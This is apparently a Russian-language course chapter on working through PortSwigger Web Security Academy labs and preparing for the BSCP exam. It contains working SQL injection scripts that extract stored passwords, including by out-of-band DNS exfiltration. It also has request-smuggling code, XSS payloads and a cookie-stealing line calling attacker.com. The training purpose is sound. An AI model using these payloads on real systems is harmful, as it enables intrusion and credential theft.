# Глава 11.6: PortSwigger Academy — методология

## 🎯 Цели главы

- Понять структуру и возможности PortSwigger Web Security Academy
- Освоить методологию прохождения лабораторных работ
- Изучить путь от новичка до сертификации BSCP
- Понять как работать с Burp Suite Community в процессе обучения
- Научиться переносить знания из Academy в реальный пентест

---

## 11.6.1 Что такое PortSwigger Web Security Academy

### Обзор платформы

**PortSwigger Web Security Academy** (portswigger.net/web-security) — это бесплатная обучающая платформа от создателей Burp Suite. Считается лучшим бесплатным ресурсом по веб-безопасности в мире.

```
ЧТО ЕСТЬ НА ПЛАТФОРМЕ:

📚 Теория:
   └── Детальные статьи по каждой уязвимости
   └── Объяснение механизмов работы атак
   └── Реальные примеры из практики
   └── Рекомендации по защите

🔬 Практика (Labs):
   └── 250+ интерактивных лабораторий
   └── Реальные приложения с уязвимостями
   └── Уровни: Apprentice / Practitioner / Expert
   └── Автоматическая проверка решений

🏆 Сертификация (BSCP):
   └── Burp Suite Certified Practitioner
   └── Признаётся работодателями
   └── Экзамен: 4 часа, 2 задания (Practitioner + Expert)
   └── Стоимость: $99 за попытку

🆓 Всё бесплатно (кроме экзамена BSCP)
```

### Почему Academy — лучший ресурс

```
СРАВНЕНИЕ С ДРУГИМИ РЕСУРСАМИ:

              │ Academy │ TryHackMe │ HTB │ OWASP |
──────────────┼─────────┼───────────┼─────┼───────┤
Глубина теории│   ★★★★★ │    ★★★    │ ★★  │  ★★★  │
Лабы по Web   │   ★★★★★ │    ★★★    │★★★★ │  ★★★  │
Бесплатность  │   ★★★★★ │    ★★★    │  ★★ │ ★★★★★ │
Современность │   ★★★★★ │    ★★★★   │★★★★ │  ★★★  │
Для работы    │   ★★★★★ │    ★★★    │★★★★ │  ★★   │
Burp Suite    │   ★★★★★ │    ★★     │ ★★  │  ★★   │
```

---

## 11.6.2 Структура Academy и карта обучения

### Категории уязвимостей

```
ПОЛНЫЙ СПИСОК КАТЕГОРИЙ PORTSWIGGER ACADEMY:

MODULE 1: Server-Side Vulnerabilities (Серверные)
├── SQL Injection (18 labs) ← НАЧАТЬ ЗДЕСЬ
├── Authentication (11 labs)
├── Path Traversal (5 labs)
├── Command Injection (5 labs)
├── Business Logic Vulnerabilities (11 labs)
├── Information Disclosure (5 labs)
├── Access Control (13 labs)
├── File Upload Vulnerabilities (7 labs)
├── Race Conditions (6 labs)
└── Server-Side Request Forgery (9 labs)

MODULE 2: Client-Side Vulnerabilities (Клиентские)
├── Cross-Site Scripting XSS (30 labs) ← МНОГО!
├── Cross-Site Request Forgery (12 labs)
├── Cross-Origin Resource Sharing (3 labs)
├── Clickjacking (5 labs)
├── DOM-based Vulnerabilities (7 labs)
└── WebSockets (3 labs)

MODULE 3: Advanced Topics (Продвинутые)
├── Insecure Deserialization (10 labs)
├── GraphQL API Vulnerabilities (5 labs)
├── Server-Side Template Injection (7 labs)
├── Web Cache Poisoning (13 labs)
├── HTTP Host Header Attacks (7 labs)
├── HTTP Request Smuggling (22 labs) ← Сложно!
├── OAuth Authentication (6 labs)
├── JWT Attacks (8 labs)
├── Prototype Pollution (9 labs)
└── Web LLM Attacks (4 labs)

MODULE 4: Advanced Tools
└── Burp Suite (документация и практика)
```

### Рекомендуемый путь обучения

```
ОПТИМАЛЬНЫЙ ПУТЬ ДЛЯ НОВИЧКА:

ФАЗА 1: Основы (1-2 месяца)
├── SQL Injection (Apprentice + Practitioner)
├── XSS (Apprentice + часть Practitioner)
├── Access Control (Apprentice)
└── Authentication (Apprentice)
Цель: 40 лаб. Уровень: понимает основные уязвимости.

ФАЗА 2: Расширение (2-3 месяца)
├── CSRF
├── SSRF
├── File Upload
├── Path Traversal
├── Command Injection
├── XXE
└── JWT Attacks
Цель: ещё 60 лаб. Уровень: готов к Junior Pentest.

ФАЗА 3: Продвинутый (3-6 месяцев)
├── HTTP Request Smuggling
├── Web Cache Poisoning
├── Deserialization
├── SSTI
├── Prototype Pollution
├── OAuth
└── GraphQL
Цель: полный охват. Уровень: Middle Pentest.

ФАЗА 4: Сертификация
├── Все Expert лабы
├── Practice exams
└── BSCP экзамен
```

---

## 11.6.3 Методология прохождения лабораторий

### Подход к каждой лаборатории

```
АЛГОРИТМ РЕШЕНИЯ ЛАБЫ:

1. ПРОЧИТАЙ ТЕОРИЮ (20 минут)
   └── Изучи всю статью по теме ПЕРЕД началом лабы
   └── Не пропускай секции "How to prevent" (защита)
   └── Обрати внимание на примеры эксплойтов

2. ПРОЧИТАЙ ОПИСАНИЕ ЛАБЫ
   └── Что нужно сделать? (получить флаг, удалить пользователя...)
   └── Какие hints даны?
   └── Какой уровень? (Apprentice/Practitioner/Expert)

3. ИССЛЕДУЙ ПРИЛОЖЕНИЕ (10-15 минут)
   └── Открой через Burp Proxy
   └── Просмотри всё вручную как пользователь
   └── Изучи все функции: login, search, comments, files
   └── Перехвати несколько запросов в Burp

4. ФОРМИРУЙ ГИПОТЕЗУ
   └── Где может быть уязвимость?
   └── Какой параметр/функция уязвима?

5. ЭКСПЛУАТИРУЙ
   └── Применяй технику из теории
   └── Используй Burp Repeater для тестирования
   └── Начинай с простых payload, усложняй

6. ЕСЛИ ЗАСТРЯЛ (>30 минут):
   └── Перечитай теоретическую статью
   └── Попробуй подсказку (Solution button — не стыдно!)
   └── Посмотри видео-walkthrough (на YouTube)
   └── Разберись КАК и ПОЧЕМУ работает решение

7. ПОСЛЕ РЕШЕНИЯ:
   └── Запиши ключевые наблюдения в заметки
   └── Попробуй сделать автоматизированный скрипт
   └── Изучи, как защититься
```

### Заметки для эффективного обучения

```markdown
## ШАБЛОН ЗАМЕТОК ДЛЯ ЛАБЫ

### [Категория] Lab Name | Уровень: Apprentice

**Цель:** Что нужно было сделать

**Уязвимость:** Где находится, в каком параметре

**Payload использован:**
```
конкретный payload
```

**Почему работает:**
Объяснение механизма уязвимости своими словами

**Что бы проверил в реальном пентесте:**
- [Пункт 1]
- [Пункт 2]

**Защита:**
Как правильно исправить уязвимость

**Связанные техники MITRE ATT&CK:**
T1190 - Exploit Public-Facing Application
```

---

## 11.6.4 SQL Injection — детальный разбор пути

Рассмотрим весь путь по SQL Injection как образец методологии.

### Apprentice Level Labs

```
SQL Injection Apprentice (5 labs):

Lab 1: WHERE clause — retrieving hidden data
Lab 2: WHERE clause — login bypass
Lab 3: UNION attack — determining number of columns
Lab 4: UNION attack — finding columns with useful data
Lab 5: UNION attack — retrieving data from other tables

ПОДХОД К APPRENTICE:
├── Читай каждый описание внимательно
├── Попробуй вручную перед автоматизацией
└── Apprentice labs — это основы, они должны решаться за 5-15 минут
```

```bash
# Lab 1: Скрытые данные через WHERE clause

# Ситуация: URL с фильтром категорий
# https://target.web-security-academy.net/filter?category=Gifts

# Уязвимый запрос (серверная сторона):
# SELECT * FROM products WHERE category = 'Gifts' AND released = 1

# Exploit: добавляем ' OR 1=1--
# https://target.web-security-academy.net/filter?category=Gifts'+OR+1=1--

# В результате:
# SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
# → OR 1=1 всегда True → показываем ВСЕ продукты включая unreleased
```

```bash
# Lab 2: Login Bypass

# Форма входа: username + password
# Уязвимый запрос: SELECT * FROM users WHERE username='ВВОД' AND password='ВВОД'

# Exploit в поле username:
# administrator'--

# Результирующий запрос:
# SELECT * FROM users WHERE username='administrator'-- AND password='любой'
# Всё после -- комментируется → входим без пароля!

# Через curl:
curl -X POST https://target.web-security-academy.net/login \
     -d "username=administrator'--&password=anything" \
     -v
```

### Practitioner Level Labs — сложнее

```python
#!/usr/bin/env python3
"""
sqli_union_attack.py
Решение Practitioner лаб по UNION атаке
"""

import requests

BASE_URL = "https://YOUR_LAB_ID.web-security-academy.net"
session = requests.Session()

def determine_columns():
    """
    Шаг 1: Определяем количество колонок через ORDER BY
    Увеличиваем число пока не получим ошибку
    """
    for i in range(1, 20):
        url = f"{BASE_URL}/filter"
        params = {"category": f"Gifts' ORDER BY {i}--"}
        resp = session.get(url, params=params)

        if resp.status_code == 500:
            print(f"[+] Number of columns: {i-1}")
            return i - 1
        elif resp.status_code == 200:
            print(f"[*] {i} columns - OK")

    return None

def find_string_column(num_cols: int):
    """
    Шаг 2: Найти колонку с типом string (для вывода текста)
    UNION SELECT NULL, NULL, 'test', NULL --
    """
    for col in range(num_cols):
        # Строим список: NULL, NULL, ... 'test' ..., NULL
        union_parts = ["NULL"] * num_cols
        union_parts[col] = "'test_string'"
        union = ", ".join(union_parts)

        url = f"{BASE_URL}/filter"
        params = {"category": f"' UNION SELECT {union}--"}
        resp = session.get(url, params=params)

        if "test_string" in resp.text:
            print(f"[+] String column found at position: {col+1}")
            return col + 1

    return None

def extract_data(num_cols: int, string_col: int, query: str):
    """
    Шаг 3: Извлечение данных через UNION
    """
    # Строим UNION с нужным запросом в нужной позиции
    union_parts = ["NULL"] * num_cols
    union_parts[string_col - 1] = query

    if num_cols > 1 and string_col > 1:
        # Можно использовать 2 строковые колонки для объединения
        pass

    union = ", ".join(union_parts)
    url = f"{BASE_URL}/filter"
    params = {"category": f"' UNION SELECT {union}--"}
    resp = session.get(url, params=params)
    return resp.text

# Использование
num_cols = determine_columns()
if num_cols:
    str_col = find_string_column(num_cols)
    if str_col:
        # Получить список таблиц
        tables = extract_data(num_cols, str_col, "table_name FROM information_schema.tables")
        print("[+] Tables found:", tables[:500])

        # Получить колонки таблицы users
        columns = extract_data(num_cols, str_col,
                               "column_name FROM information_schema.columns WHERE table_name='users'")
        print("[+] Columns:", columns[:500])

        # Получить данные
        data = extract_data(num_cols, str_col,
                           "username||'~'||password FROM users")
        print("[+] Users:", data[:500])
```

---

## 11.6.5 XSS — детальный разбор пути

```
XSS ПУТЬ ОБУЧЕНИЯ:

Reflected XSS (10 labs):
├── Apprentice: простые случаи в HTML контексте
├── Practitioner: обход WAF, контексты JS, attrs
└── Expert: CSP bypass, dangling markup

Stored XSS (6 labs):
├── Apprentice: базовый Stored XSS
├── Practitioner: в разных контекстах
└── Expert: XSS in Angular sandboxes

DOM-based XSS (10 labs):
├── Apprentice: innerHTML, document.write
├── Practitioner: location.href, postMessage
└── Expert: prototype pollution через DOM
```

```javascript
// Контексты XSS и соответствующие payload

// 1. HTML контекст (самый простой)
// <p>Hello, USER_INPUT</p>
// Payload: <script>alert(1)</script>
// Или: <img src=x onerror=alert(1)>

// 2. Атрибут HTML (внутри тегов)
// <input value="USER_INPUT">
// Payload: "><script>alert(1)</script>
// Или: " onfocus="alert(1)" autofocus="

// 3. JS строка (в строке JavaScript)
// var greeting = "Hello, USER_INPUT";
// Payload: "; alert(1)//
// Результат: var greeting = "Hello, "; alert(1)//";

// 4. URL контекст
// <a href="USER_INPUT">link</a>
// Payload: javascript:alert(1)
// Payload: javascript:alert(document.cookie)

// 5. JS строка в теге script (закрываем тег)
// <script>var x = 'USER_INPUT';</script>
// Payload: </script><script>alert(1)</script>

// Практический XSS для кражи cookie:
// <script>
//   fetch('https://attacker.com/?c=' + document.cookie)
// </script>

// PortSwigger Collaborator URL для Out-of-Band:
// <script>
//   fetch('https://YOUR_BURP_COLLABORATOR.oastify.com/?c='+document.cookie)
// </script>
```

### Burp Suite для обучения в Academy

```
BURP SUITE ПРИ РЕШЕНИИ LAB:

Обязательно использовать:
├── Proxy → Intercept: перехват запросов
├── Proxy → HTTP history: история запросов (не пропустить)
├── Repeater: многократное тестирование payload
├── Decoder: base64/URL/HTML encoding
└── Target → Site map: карта сайта

Полезно использовать:
├── Intruder (медленный в Community): fuzzing параметров
├── Scanner (только Pro): автоматический поиск уязвимостей
└── Collaborator: Out-of-band тестирование (SSRF, XXE, blind SQLi)

ТИПИЧНЫЙ WORKFLOW В REPEATER:
1. Перехватить нужный запрос в Proxy
2. Отправить в Repeater (Ctrl+R)
3. Модифицировать параметр
4. Нажать Send → Смотреть Response
5. Итерировать payload
6. При успехе → задокументировать

KEYBOARD SHORTCUTS BURP:
Ctrl+R    → Отправить в Repeater
Ctrl+I    → Отправить в Intruder
Ctrl+Shift+S → Поиск по истории
Ctrl+F    → Поиск в запросе/ответе
```

---

## 11.6.6 Продвинутые темы: Request Smuggling

HTTP Request Smuggling — одна из самых сложных тем в Academy. Требует понимания HTTP/1.1 и работы прокси-серверов.

```
КОНЦЕПЦИЯ HTTP REQUEST SMUGGLING:

Фронтенд прокси → Бэкенд сервер

Content-Length vs Transfer-Encoding: chunked
├── CL.TE: Frontend использует Content-Length,
│         Backend — Transfer-Encoding
└── TE.CL: Frontend использует Transfer-Encoding,
           Backend — Content-Length

ПРИМЕР CL.TE атаки:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

Фронтенд видит CL=13, читает до "SMUGGLED" (13 байт), передаёт
Бэкенд видит TE:chunked, chunk "0" = конец тела, "SMUGGLED" — начало нового запроса!
```

```python
#!/usr/bin/env python3
"""
request_smuggling_test.py
Базовый тест HTTP Request Smuggling (CL.TE)
Используется в контексте PortSwigger Academy Labs
"""

import socket
import ssl

def send_raw_request(host: str, port: int, request: str, use_ssl: bool = True) -> str:
    """
    Отправка сырого HTTP запроса для тестирования Request Smuggling
    Burp Suite не всегда корректно работает для этих атак
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    try:
        sock.connect((host, port))
        sock.send(request.encode('utf-8'))

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        return response.decode('utf-8', errors='replace')
    finally:
        sock.close()

# Тест CL.TE Request Smuggling
def test_cl_te_smuggling(host: str):
    """
    Тест: можем ли мы "протащить" запрос?
    """
    # Первый запрос — с smuggled данными
    smuggling_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"          # Frontend видит CL=6 (считает 6 байт тела)
        "Transfer-Encoding: chunked\r\n"  # Backend видит TE:chunked
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"                          # Backend: конец chunked body
        "\r\n"
        "X"                              # Backend: это начало следующего запроса!
        # Frontend: это часть тела (6 байт = "0\r\n\r\nX")
    )

    print(f"[*] Testing CL.TE smuggling on {host}")
    response = send_raw_request(host, 443, smuggling_request)
    print(f"[*] Response:\n{response[:500]}")

# Реальный payload для Academy лаб (концептуальный)
def smuggle_admin_request(host: str, victim_path: str = "/admin"):
    """
    Протащить запрос к /admin (проверка доступа через smuggling)
    """
    # Smuggled request будет добавлен как prefix к следующему запросу жертвы
    smuggled_prefix = f"GET {victim_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: "

    main_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(smuggled_prefix) + 5}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        + smuggled_prefix
    )

    return send_raw_request(host, 443, main_request)
```

---

## 11.6.7 Путь к сертификации BSCP

### Что такое BSCP

**BSCP (Burp Suite Certified Practitioner)** — профессиональная сертификация от PortSwigger, подтверждающая навыки веб-пентеста.

```
ДЕТАЛИ ЭКЗАМЕНА BSCP:

Формат:
├── Длительность: 4 часа
├── 2 приложения с уязвимостями
├── Нужно решить ОБА для сертификата
├── Приложение 1: Practitioner level
└── Приложение 2: Expert level

Что проверяется:
├── Умение находить уязвимости без подсказок
├── Умение эксплуатировать нетривиальные варианты
├── Скорость работы (4 часа на всё)
└── Знание продвинутых техник

Стоимость:
└── $99 за одну попытку

Уровень сложности: ВЫСОКИЙ
├── Только ~30-40% сдают с первого раза
└── Требует прохождения ВСЕХ Practitioner + Expert лаб
```

### Подготовка к BSCP

```
ПЛАН ПОДГОТОВКИ К BSCP (3-6 месяцев):

Месяц 1-2: Все Apprentice + Practitioner лабы
├── Приоритет: SQLi, XSS, Auth, Access Control, SSRF, XXE
└── Цель: уметь решать Practitioner без подсказок

Месяц 3-4: Все Expert лабы
├── Request Smuggling, Cache Poisoning, Deserialization
└── Цель: понимать продвинутые атаки

Месяц 5: Тренировочные экзамены
├── PortSwigger предоставляет practice exams
└── Симуляция реального экзамена: 4 часа, без подсказок

Советы:
├── Проходи лабы без Solution первые 30 минут
├── Ведите заметки с payload-чеклистами
├── Практикуй Burp Suite до автоматизма
└── Повторяй решённые лабы через несколько дней
```

### Чеклист навыков для BSCP

```
ОБЯЗАТЕЛЬНЫЕ НАВЫКИ ДЛЯ BSCP:

SQL Injection:
□ Union-based (все варианты)
□ Blind (Boolean + Time-based)
□ Error-based
□ Out-of-band (через DNS)
□ Обход WAF фильтров

XSS:
□ Reflected в разных контекстах (HTML, JS, attrs, URL)
□ Stored XSS
□ DOM-based
□ Обход CSP (Content Security Policy)
□ Кража cookie через XSS

Authentication:
□ Username enumeration
□ Brute force с bypass lockout
□ MFA bypass
□ JWT атаки (alg:none, слабый секрет, RS256→HS256)

Access Control:
□ Horizontal privilege escalation
□ Vertical privilege escalation
□ IDOR через indirect reference
□ Обход через нестандартные заголовки

SSRF:
□ Базовый SSRF
□ SSRF против localhost
□ Обход blacklist фильтров
□ Blind SSRF через Collaborator
□ SSRF в облачных средах (metadata)

File Upload:
□ Обход extension check
□ Обход content-type check
□ Web shell через ImageMagick (polyglot)
□ Stored XSS через SVG/HTML загрузку

Race Conditions:
□ Limit overrun
□ Time-of-check/Time-of-use (TOCTOU)

Deserialization:
□ PHP object injection
□ Java deserialization (ysoserial)
□ Python pickle

HTTP Request Smuggling:
□ CL.TE и TE.CL detection
□ Bypass front-end security
□ Cache poisoning via smuggling
□ Capture других пользователей запросов

Web Cache Poisoning:
□ Базовый cache poisoning
□ DOM-based cache poisoning
□ Через Host header
□ Через параметры не из whitelist
```

---

## 11.6.8 Практический пример: решение lab от начала до конца

Разберём детально подход к Practitioner-уровневой лабе.

### Lab: Blind SQL injection with out-of-band data exfiltration

```
ОПИСАНИЕ ЛАБЫ:
Приложение уязвимо к Blind SQLi через cookie.
Нет видимого вывода данных в ответе.
Используйте Burp Collaborator для получения данных.
Задача: Получить пароль пользователя administrator.
```

```python
#!/usr/bin/env python3
"""
blind_sqli_oob.py
Решение Blind SQLi with Out-of-Band данными
Требует Burp Suite Pro (Collaborator) или ngrok сервер
"""

import requests
import urllib.parse

# Настройки
LAB_URL = "https://YOUR_LAB_ID.web-security-academy.net"
COLLABORATOR_URL = "your-collaborator-id.oastify.com"  # Burp Collaborator

# Тест 1: Проверяем, работает ли DNS lookup через SQLi
def test_oob_dns():
    """
    Oracle SQL payload для DNS lookup:
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"...'),...)
    """
    oracle_dns_test = (
        "' UNION SELECT EXTRACTVALUE(xmltype("
        "'<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM "
        f"\"http://{COLLABORATOR_URL}/\"> %remote;]>'),'/l') FROM dual--"
    )

    # Отправляем через cookie
    cookies = {"TrackingId": oracle_dns_test}
    resp = requests.get(LAB_URL, cookies=cookies)

    print(f"[*] Test response: {resp.status_code}")
    print(f"[*] Check Collaborator for DNS request from {COLLABORATOR_URL}")
    return resp.status_code == 200

# Тест 2: Эксфильтрация пароля через DNS
def exfiltrate_password():
    """
    DNS exfiltration: отправляем пароль как subdomain
    password.YOUR_COLLABORATOR.oastify.com
    """
    # Oracle версия: SELECT REGEXP_SUBSTR(password, ...) FROM users WHERE username='administrator'
    oracle_exfil = (
        "' UNION SELECT EXTRACTVALUE(xmltype("
        "'<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM "
        f"\"http://\"||"
        "(SELECT password FROM users WHERE username='administrator')"
        f"||'.{COLLABORATOR_URL}/\"> %remote;]>'),'/l') FROM dual--"
    )

    cookies = {"TrackingId": oracle_exfil}
    resp = requests.get(LAB_URL, cookies=cookies)

    print(f"[*] Exfiltration request sent: {resp.status_code}")
    print(f"[!] Check Collaborator — password will appear as DNS subdomain!")
    print(f"    Format: [password].{COLLABORATOR_URL}")

# Альтернатива без Collaborator: Time-based blind SQLi
def time_based_extract():
    """
    Для Burp Community (без Collaborator):
    Используем time-based blind extraction
    PostgreSQL: pg_sleep(10)
    MySQL: SLEEP(10)
    """
    import string
    import time

    found_password = ""
    charset = string.ascii_lowercase + string.digits + "_"

    for pos in range(1, 30):  # Позиция в строке
        for char in charset:
            # PostgreSQL payload:
            payload = (
                f"' || (SELECT CASE WHEN (username='administrator' AND "
                f"SUBSTRING(password,{pos},1)='{char}') "
                f"THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
            )

            cookies = {"TrackingId": payload}
            start = time.time()
            try:
                resp = requests.get(LAB_URL, cookies=cookies, timeout=10)
                elapsed = time.time() - start
            except requests.exceptions.Timeout:
                elapsed = 10

            if elapsed >= 5:
                found_password += char
                print(f"\r[+] Password so far: {found_password}", end="", flush=True)
                break
        else:
            print(f"\n[+] Complete password: {found_password}")
            break

    return found_password


if __name__ == "__main__":
    print("[*] Testing Out-of-Band DNS...")
    if test_oob_dns():
        print("[*] Exfiltrating password...")
        exfiltrate_password()
    else:
        print("[*] Falling back to time-based extraction...")
        time_based_extract()
```

---

## 11.6.9 Интеграция Academy с реальным пентестом

### Разрыв между Academy и реальностью

```
ЧТО ОТЛИЧАЕТСЯ В РЕАЛЬНОМ ПЕНТЕСТЕ:

ACADEMY:                          РЕАЛЬНОСТЬ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Одна уязвимость на лабу        • Несколько уязвимостей
• Уязвимость гарантирована       • Может не быть уязвимостей
• Явный hint в описании          • Нет подсказок
• Чистое приложение              • Сложное, запутанное приложение
• 4 часа на 2 задания            • Дни/недели на всё приложение
• Флаг = решение                 • Цепочки уязвимостей
• Один пользователь              • Аутентификация, сессии, API keys
```

### Как переносить знания в реальность

```
АКАДЕМИЯ → РЕАЛЬНЫЙ ПЕНТЕСТ:

После каждой темы в Academy:

1. СОСТАВЬ ЧЕКЛИСТ ТЕСТИРОВАНИЯ
   Пример для File Upload:
   □ Загрузить .php файл — что происходит?
   □ Сменить Content-Type на image/jpeg и повторить
   □ Попробовать .phtml, .php5, .phar расширения
   □ Попробовать null byte: shell.php%00.jpg
   □ Попробовать двойное расширение: shell.php.jpg
   □ Проверить, куда сохраняется файл (угадать путь)
   □ Загрузить SVG с XSS payload
   □ Проверить path traversal в имени файла

2. АВТОМАТИЗИРУЙ ТЕСТ
   Напиши Python скрипт для каждого типа уязвимости

3. ДОБАВЬ В СВОЙ METHODOLOGY DOCUMENT
   Персональная шпаргалка по каждой уязвимости:
   ├── Где искать (параметры, headers, cookies)
   ├── Как тестировать (manual + automated)
   ├── Payload bank (собственная коллекция)
   └── Как документировать в отчёте
```

### Шаблон методологии пентестера

```
МОЯ МЕТОДОЛОГИЯ ВЕБ-ПЕНТЕСТА:

1. РАЗВЕДКА
   □ subdomain enum: subfinder, amass
   □ port scan: nmap -sV -sC
   □ tech stack: whatweb, wappalyzer
   □ crawl: gospider, hakrawler
   □ endpoints: katana, gau

2. ПОВЕРХНОСТЬ АТАКИ
   □ Все формы ввода
   □ Все параметры (GET, POST, JSON, XML)
   □ Заголовки (Host, X-Forwarded-For, User-Agent)
   □ Cookie параметры
   □ File upload endpoints
   □ API endpoints
   □ Authentication/Authorization flows

3. ТЕСТИРОВАНИЕ ПО OWASP TOP 10
   □ A01: Broken Access Control (IDOR, privilege escalation)
   □ A02: Cryptographic Failures (слабое шифрование, sensitive data)
   □ A03: Injection (SQLi, Command, SSTI, XXE)
   □ A04: Insecure Design (logic flaws, business logic)
   □ A05: Security Misconfiguration (exposed admin, default creds)
   □ A06: Vulnerable Components (outdated libraries)
   □ A07: Auth Failures (brute force, weak session)
   □ A08: Software Integrity Failures (supply chain)
   □ A09: Logging Failures (no detection)
   □ A10: SSRF

4. АВТОМАТИЗАЦИЯ
   □ nuclei: nuclei -u target.com -t cves/ -t exposures/
   □ nikto: nikto -h target.com
   □ sqlmap: sqlmap -u "target.com/page?id=1" --batch
   □ dalfox: dalfox url "target.com/?q=test"

5. EXPLOITATION
   □ Ручная эксплуатация найденных уязвимостей
   □ Цепочки уязвимостей
   □ Доказательство impact (PoC)

6. ДОКУМЕНТИРОВАНИЕ
   □ Screenshot каждой уязвимости
   □ Точный payload и шаги воспроизведения
   □ CVSS-оценка
   □ Рекомендация по исправлению
```

---

## 📌 Итоги главы

- PortSwigger Web Security Academy — лучший бесплатный ресурс по веб-безопасности: 250+ лаб, детальная теория, реальные приложения
- Оптимальный путь: SQL Injection → XSS → Authentication → Access Control → SSRF/XXE → JWT → Advanced
- Методология каждой лабы: теория → исследование → гипотеза → эксплуатация → заметки
- Для BSCP нужно пройти ВСЕ Practitioner и Expert лабы (3-6 месяцев активной практики)
- Academy → реальность: составляй чеклисты, автоматизируй, создавай личную методологию
- Burp Suite — основной инструмент; Community достаточно для обучения, Pro нужен для BSCP

---

## 🏠 Домашнее задание

1. **Базовый уровень:** Зарегистрируйтесь на portswigger.net/web-security и пройдите первые 5 Apprentice лаб по SQL Injection. Для каждой лабы сделайте заметку по шаблону из раздела 11.6.3.

2. **Средний уровень:** Пройдите все Apprentice лабы по XSS (10 штук). Создайте свой "XSS payload cheatsheet" — таблицу с payload для каждого контекста.

3. **Продвинутый уровень:** Попробуйте решить любую Practitioner-уровневую лабу по теме "Authentication" без использования кнопки Solution. Если не получается — изучи теоретическую статью, и попробуй снова.

4. **Практика автоматизации:** Напишите скрипт для автоматического решения Lab 1 по SQLi ("Retrieving hidden data"). Скрипт должен автоматически отправлять payload и проверять результат.

---

## 🔗 Полезные ресурсы

| Ресурс | URL | Описание |
|--------|-----|----------|
| Web Security Academy | portswigger.net/web-security | Основной ресурс |
| BSCP Certification | portswigger.net/web-security/certification | Информация об экзамене |
| Burp Suite Community | portswigger.net/burp/communitydownload | Бесплатная версия |
| PayloadsAllTheThings | github.com/swisskyrepo/PayloadsAllTheThings | База payload |
| HackTricks Web | book.hacktricks.xyz/pentesting-web | Методология пентеста |
| OWASP Testing Guide | owasp.org/www-project-web-security-testing-guide | Официальный гайд |
| nahamsec/resources | github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters | Ресурсы для Bug Bounty |
